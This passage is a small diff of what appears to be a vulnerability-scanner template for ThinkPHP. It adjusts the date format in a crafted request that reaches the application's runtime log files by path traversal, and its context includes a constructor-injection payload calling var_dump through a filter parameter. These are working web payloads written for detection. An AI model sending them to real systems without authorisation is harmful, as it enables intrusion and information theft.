@@ -168,7 +168,7 @@ requests:
         s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump
       # datetime.datetime.now().strftime("%Y_%m_%d")[2:]
       - |+
-        GET /index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{{date("%Y-%M-%D")}}.log HTTP/1.1
+        GET /index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{{substr(date("%Y-%M-%D"),2)}}.log HTTP/1.1
         Host: {{Hostname}}
         Accept:*/*
         Pragma:no-cache
